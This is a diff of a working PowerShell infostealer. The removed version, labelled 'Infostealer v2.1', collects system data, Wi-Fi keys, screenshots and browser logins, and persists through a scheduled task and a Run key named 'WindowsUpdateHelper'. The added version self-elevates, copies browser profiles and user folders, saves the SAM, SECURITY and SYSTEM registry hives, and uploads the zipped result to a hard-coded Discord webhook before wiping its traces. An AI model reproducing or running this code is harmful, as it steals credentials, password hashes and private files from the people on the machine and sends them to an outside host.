@@ -1,149 +1,121 @@
-@echo off
-set "tempfile=%TEMP%\temp_ps.ps1"
-findstr /v /c:"REM SCRIPT" "%~f0" > "%tempfile%"
-powershell -ExecutionPolicy Bypass -File "%tempfile%"
-del "%tempfile%" 2>nul
-exit /b
-REM SCRIPT
-# Infostealer v2.1 - No Discord Exfil (local dump only)
-# Collects: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
-# Output: %TEMP%\system_dump.json
+# CollectExfil_Discord.ps1 - PowerShell script to gather system data and send ZIP via Discord webhook
+# Run as Administrator for full access.
+# Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot
+
+# ---------- SELF-ELEVATE TO ADMIN ----------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[!] Restarting as Administrator..."
+    Start-Process powershell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
+    exit
+}
+
+# ---------- CONFIGURATION ----------
+$WebhookUrl = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"
+
+$WorkDir = "$env:TEMP\collect_$([System.IO.Path]::GetRandomFileName())"
+$ZipFile = "$env:TEMP\data_$([System.IO.Path]::GetRandomFileName()).zip"
+
+# ---------- CREATE WORK DIRECTORY ----------
+New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
 
 # ---------- 1. SYSTEM INFORMATION ----------
-function Get-SystemInfo {
-    try {
-        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
-        $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
-        $cpu = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue
-        $disk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
-        $gpu = Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1
-        return @{
-            ComputerName = $env:COMPUTERNAME
-            UserName = $env:USERNAME
-            Domain = $cs.Domain
-            Manufacturer = $cs.Manufacturer
-            Model = $cs.Model
-            TotalRAM_GB = [math]::Round($cs.TotalPhysicalMemory/1GB,2)
-            CPU = $cpu.Name
-            Cores = $cpu.NumberOfCores
-            OS = "$($os.Caption) Build $($os.BuildNumber)"
-            Disk = ($disk | ForEach-Object {"$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))GB free of $([math]::Round($_.Size/1GB,1))GB"}) -join "; "
-            GPU = $gpu.Name
-        }
-    } catch { return @{Error="SystemInfo: $($_.Exception.Message)"} }
+Write-Host "[+] Collecting system info..."
+systeminfo.exe > "$WorkDir\systeminfo.txt" 2>$null
+ipconfig /all > "$WorkDir\ipconfig.txt" 2>$null
+tasklist /v > "$WorkDir\tasklist.txt" 2>$null
+netstat -ano > "$WorkDir\netstat.txt" 2>$null
+
+# WMI / CIM data
+Get-CimInstance -ClassName Win32_BIOS | Format-List * > "$WorkDir\cim_bios.txt"
+Get-CimInstance -ClassName Win32_Processor | Format-List * > "$WorkDir\cim_cpu.txt"
+Get-CimInstance -ClassName Win32_LogicalDisk | Format-List * > "$WorkDir\cim_disk.txt"
+Get-CimInstance -ClassName Win32_Service | Format-Table Name, State, StartMode > "$WorkDir\cim_services.txt"
+Get-CimInstance -ClassName Win32_UserAccount | Format-Table Name, Domain, SID > "$WorkDir\cim_users.txt"
+Get-CimInstance -ClassName Win32_StartupCommand | Format-Table Name, Command, Location > "$WorkDir\cim_startup.txt"
+
+# ---------- 2. NETWORK SHARES AND FIREWALL ----------
+net share > "$WorkDir\shares.txt" 2>$null
+netsh advfirewall show allprofiles > "$WorkDir\firewall.txt" 2>$null
+
+# ---------- 3. WI-FI PASSWORDS ----------
+Write-Host "[+] Extracting Wi-Fi passwords..."
+$wifiOut = "$WorkDir\wifi.txt"
+netsh wlan show profiles | Select-String " : " | ForEach-Object {
+    $profile = ($_ -split ":")[1].Trim()
+    netsh wlan show profile name="$profile" key=clear >> $wifiOut 2>$null
 }
 
-# ---------- 2. NETWORK & IP ----------
-function Get-NetworkInfo {
-    try {
-        $public = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
-        $local = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
-        $isp = (Invoke-WebRequest -Uri "https://ipinfo.io/org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
-        $mac = (Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
-        return @{ PublicIP=$public; LocalIP=$local; ISP=$isp; MAC=$mac }
-    } catch { return @{Error="Network: $($_.Exception.Message)"} }
-}
-
-# ---------- 3. WIFI PASSWORDS ----------
-function Get-WiFiPasswords {
-    $profiles = netsh wlan show profiles | Select-String " : " | ForEach-Object { ($_ -split ":")[1].Trim() }
-    $result = @()
-    foreach ($p in $profiles) {
-        $output = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
-        $pass = if ($output) { ($output -split ":")[1].Trim() } else { "(none)" }
-        $result += "$p : $pass"
+# ---------- 4. BROWSER DATA ----------
+Write-Host "[+] Collecting browser profiles..."
+$browserDirs = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*"
+)
+$browserTarget = "$WorkDir\browser"
+New-Item -ItemType Directory -Path $browserTarget -Force | Out-Null
+foreach ($dir in $browserDirs) {
+    if (Test-Path $dir) {
+        $dest = Join-Path $browserTarget (Split-Path $dir -Leaf)
+        Copy-Item -Path $dir -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
     }
-    return ($result -join "`n")
 }
 
-# ---------- 4. SCREENSHOT (BASE64) ----------
-function Get-ScreenshotBase64 {
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-        $ms = New-Object System.IO.MemoryStream
-        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $bytes = $ms.ToArray()
-        $ms.Close()
-        return [Convert]::ToBase64String($bytes)
-    } catch { return "Screenshot failed" }
-}
-
-# ---------- 5. PROCESS LIST ----------
-function Get-ProcessList {
-    try {
-        $procs = Get-Process -ErrorAction SilentlyContinue | Sort-Object -Property CPU -Descending | Select-Object -First 20
-        return ($procs | ForEach-Object {"$($_.ProcessName) PID:$($_.Id) CPU:$($_.CPU) MB:$([math]::Round($_.WorkingSet/1MB,1))"}) -join "`n"
-    } catch { return "Process error" }
-}
-
-# ---------- 6. BROWSER LOGINS ----------
-function Get-BrowserLogins {
-    $browsers = @(
-        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
-        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
-    )
-    $logins = @()
-    foreach ($b in $browsers) {
-        if (Test-Path $b.Path) {
-            try {
-                $temp = "$env:TEMP\login_temp.db"
-                Copy-Item $b.Path -Destination $temp -Force -ErrorAction SilentlyContinue
-                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
-                $conn.Open()
-                $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins LIMIT 5"
-                $reader = $cmd.ExecuteReader()
-                while ($reader.Read()) {
-                    $url = $reader['origin_url']
-                    $user = $reader['username_value']
-                    $logins += "[$($b.Name)] $url | $user | (encrypted)"
-                }
-                $conn.Close()
-                Remove-Item $temp -Force -ErrorAction SilentlyContinue
-            } catch { $logins += "[$($b.Name)] Error reading" }
-        }
+# ---------- 5. USER FILES (Desktop, Documents, Downloads) ----------
+Write-Host "[+] Collecting user files..."
+$userFolders = @(
+    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\Documents",
+    "$env:USERPROFILE\Downloads"
+)
+$filesTarget = "$WorkDir\files"
+New-Item -ItemType Directory -Path $filesTarget -Force | Out-Null
+foreach ($f in $userFolders) {
+    if (Test-Path $f) {
+        $dest = Join-Path $filesTarget (Split-Path $f -Leaf)
+        Copy-Item -Path $f -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
     }
-    if ($logins.Count -eq 0) { return "No browser logins found" }
-    return ($logins -join "`n")
 }
 
-# ---------- 7. BUILD DATA ----------
-$Data = @{
-    System = Get-SystemInfo
-    Network = Get-NetworkInfo
-    WiFi = Get-WiFiPasswords
-    Screenshot = Get-ScreenshotBase64
-    Processes = Get-ProcessList
-    Logins = Get-BrowserLogins
-    Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
+# ---------- 6. REGISTRY HIVES ----------
+Write-Host "[+] Dumping registry hives..."
+reg save HKLM\SAM "$WorkDir\reg_SAM.hiv" /y 2>$null
+reg save HKLM\SECURITY "$WorkDir\reg_SECURITY.hiv" /y 2>$null
+reg save HKLM\SYSTEM "$WorkDir\reg_SYSTEM.hiv" /y 2>$null
+reg export HKLM\SOFTWARE "$WorkDir\reg_SOFTWARE.reg" 2>$null
+reg export HKCU\SOFTWARE "$WorkDir\reg_USER.reg" 2>$null
+
+# ---------- 7. COMPRESS INTO ZIP ----------
+Write-Host "[+] Compressing data..."
+Compress-Archive -Path "$WorkDir\*" -DestinationPath $ZipFile -Force -ErrorAction Stop
+if (-not (Test-Path $ZipFile)) {
+    Write-Host "[-] Compression failed."; exit 1
 }
 
-$json = $Data | ConvertTo-Json -Depth 10 -Compress
+# ---------- 8. SEND ZIP VIA DISCORD WEBHOOK ----------
+Write-Host "[+] Sending ZIP to Discord webhook..."
+Add-Type -AssemblyName System.Net.Http
 
-# ---------- 8. LOCAL OUTPUT (no Discord) ----------
-$outFile = "$env:TEMP\system_dump.json"
-$json | Out-File -FilePath $outFile -Encoding UTF8 -Force
-Write-Host "[+] Data saved to $outFile"
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
 
-# ---------- 9. PERSISTENCE (Task Scheduler + Registry) ----------
-$scriptPath = $MyInvocation.MyCommand.Path
-if (-not (Get-ScheduledTask -TaskName "WindowsUpdateHelper" -ErrorAction SilentlyContinue)) {
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes 10)
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+$fileStream = [System.IO.File]::OpenRead($ZipFile)
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+$content.Add($fileContent, "file", [System.IO.Path]::GetFileName($ZipFile))
+
+try {
+    $response = $client.PostAsync($WebhookUrl, $content).Result
+    $response.EnsureSuccessStatusCode() | Out-Null
+    Write-Host "[+] ZIP sent successfully."
+} catch {
+    Write-Host "[-] Upload failed: $($_.Exception.Message)"
 }
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+$fileStream.Close()
 
-# ---------- 10. SELF-DELETE (if -cleanup) ----------
-if ($args -contains "-cleanup") {
-    Start-Sleep -Seconds 15
-    Unregister-ScheduledTask -TaskName "WindowsUpdateHelper" -Confirm:$false -ErrorAction SilentlyContinue
-    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Force -ErrorAction SilentlyContinue
-    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
-}
+# ---------- 9. CLEANUP ----------
+Write-Host "[+] Cleaning up..."
+Remove-Item -Path $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $ZipFile -Force -ErrorAction SilentlyContinue
+
+Write-Host "[+] Script completed."
